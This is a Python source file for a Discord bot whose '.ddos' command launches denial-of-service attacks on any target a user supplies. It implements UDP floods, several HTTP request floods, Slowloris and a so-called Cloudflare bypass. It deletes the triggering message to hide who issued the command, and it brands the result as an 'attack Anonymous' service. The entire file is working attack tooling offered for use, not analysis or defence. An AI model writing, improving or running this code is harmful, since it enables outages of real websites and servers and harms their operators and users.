import discord
from discord.ext import commands
import threading
import socket
import random
import time
import requests
import httpx

# طلب التوكن من المستخدم
token = input("Please enter your Discord bot token: ")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

user_agents = [
    "Mozilla/5.0", "Chrome/90.0", "Opera/9.80", "Safari/537.36",
    "Edge/91.0", "Firefox/89.0"
]

# UDP Bypass
def udp_bypass(ip, port, threads, duration):
    def run():
        end = time.time() + duration
        data = random._urandom(1024)
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (ip, port))
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

# HTTP FLOOD
def http_flood(target, threads, duration):
    def run():
        end = time.time() + duration
        while time.time() < end:
            try:
                requests.get(target, timeout=3)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

# HTTP SOCKET
def http_socket(target, threads, duration):
    def run():
        end = time.time() + duration
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        while time.time() < end:
            try:
                s = socket.socket()
                s.connect((host, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

# HTTP RAW
def http_raw(target, threads, duration):
    def run():
        end = time.time() + duration
        while time.time() < end:
            try:
                requests.get(target)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

# HTTP RAND
def http_rand(target, threads, duration):
    def run():
        end = time.time() + duration
        while time.time() < end:
            try:
                headers = {"User-Agent": random.choice(user_agents)}
                requests.get(target, headers=headers)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

# SLOWLORIS
def slow_attack(target, threads, duration):
    def run():
        end = time.time() + duration
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        while time.time() < end:
            try:
                s = socket.socket()
                s.connect((host, 80))
                s.send(b"GET / HTTP/1.1\r\n")
                for _ in range(50):
                    s.send(b"X-a: b\r\n")
                    time.sleep(1)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

# CLOUDFLARE BYPASS
def cloudflare_attack(target, threads, duration):
    def run():
        end = time.time() + duration
        while time.time() < end:
            try:
                with httpx.Client(http2=True, timeout=5) as client:
                    client.get(target, headers={"User-Agent": random.choice(user_agents)})
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

@bot.command()
async def ddos(ctx, method: str, target: str, threads: int = 10, duration: int = 60):
    await ctx.message.delete()
    method = method.upper()

    if method == "CLOUDFLARE":
        cloudflare_attack(target, threads, duration)
    elif method == "UDP-BYPASS":
        port = 80  # بورت افتراضي
        udp_bypass(target, port, threads, duration)
    elif method == "HTTP-FLOOD":
        http_flood(target, threads, duration)
    elif method == "HTTP-SOCKET":
        http_socket(target, threads, duration)
    elif method == "HTTP-RAW":
        http_raw(target, threads, duration)
    elif method == "HTTP-RAND":
        http_rand(target, threads, duration)
    elif method == "SLOW":
        slow_attack(target, threads, duration)
    else:
        await ctx.send("**Invalid method. Use one of: UDP-BYPASS, HTTP-FLOOD, HTTP-SOCKET, HTTP-RAW, HTTP-RAND, SLOW, CLOUDFLARE**")
        return

    embed = discord.Embed(
        title="attack anonymous Network | DDoS Attack Sent",
        description=f"**Attack Sent!**\n**Method**: {method}\n**Threads**: {threads}\n**Time**: {duration}s\n**Target**: {target}",
        color=discord.Color.red()
    )
    embed.set_footer(text="©2025 attack Anonymous.")
    await ctx.send(embed=embed)

bot.run(token)
